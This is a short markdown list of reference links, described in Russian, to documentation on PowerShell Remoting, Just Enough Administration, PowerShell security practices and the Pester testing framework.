- [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands) - как работает Remoting
- [JEA Documentation](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview) - Just Enough Administration
- [PowerShell Security](https://devblogs.microsoft.com/powershell/powershell-security-best-practices/) - безопасность PowerShell
- [Pester Testing Framework](https://pester.dev) - тестирование скриптов
